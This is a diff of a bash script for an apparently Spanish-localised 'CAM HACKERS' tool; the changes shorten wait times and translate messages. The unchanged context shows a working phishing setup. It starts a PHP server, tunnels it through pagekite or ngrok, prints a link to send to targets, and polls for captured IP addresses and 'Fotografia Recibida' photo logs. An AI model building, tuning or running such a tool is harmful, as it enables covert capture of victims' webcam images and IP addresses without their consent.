@@ -7,7 +7,7 @@ banner() {
 
 printf "\e[1;35m  ▄▄·  ▄▄▄· • ▌ ▄ ·. \e[0m\e[1;36m  ▄ .▄ ▄▄▄·  ▄▄· ▄ •▄ ▄▄▄ .▄▄▄  .▄▄ · \e[0m\n"
 printf "\e[1;35m ▐█ ▌▪▐█ ▀█ ·██ ▐███▪\e[0m\e[1;36m ██▪▐█▐█ ▀█ ▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·▐█ ▀. \e[0m\n"
-printf "\e[1;35m ██ ▄▄ █▀▀█ ▐█ ▌▐▌▐█·\e[0m\e[1;36m ██▀▐█▄█▀▀█ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ ▄▀▀▀█▄\e[0m\n"
+printf "\e[1;35m ██ ▄▄██▀▀█ ▐█ ▌▐▌▐█·\e[0m\e[1;36m ██▀▐█▄█▀▀█ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ ▄▀▀▀█▄\e[0m\n"
 printf "\e[1;35m ▐███▌▐█ ▪▐▌██ ██▌▐█▌\e[0m\e[1;36m ▀█▌▐▀▐█ ▪▐▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌▐█▄▪▐█\e[0m\n"
 printf "\e[1;35m ·▀▀▀  ▀  ▀ ▀▀  █▪▀▀▀\e[0m\e[1;36m  ▀▀ · ▀  ▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀ ▀▀▀▀ \e[0m\n"
 printf "\e[1;35m                     \e[0m                                 \n"
@@ -73,13 +73,13 @@ rm -rf ip.txt
 
 fi
 
-sleep 0.5
+sleep 0.2
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Fotografia Recibida!\e[0m\n"
 rm -rf Log.log
 fi
-sleep 0.5
+sleep 0.2
 
 done 
 
@@ -100,16 +100,16 @@ if [[ $subdomain_resp == true ]]; then
 
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 pagekite.me  2> /dev/null > sendlink ' &
 
-sleep 8
+sleep 4
 else
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 pagekite.me 2> /dev/null > sendlink ' &
 
-sleep 8
+sleep 4
 fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Iniciando Servidor php... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
+sleep 0.5
 send_link=$(grep -o "https://[0-9a-z]*\.pagekite.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
@@ -133,7 +133,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Requiere unzip porfavor instalelo."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "Requiere wget."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Descargando Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -144,7 +144,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;93m[!] Error de Descarga.. Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
 
@@ -166,7 +166,7 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando Servidor ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+sleep 5
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
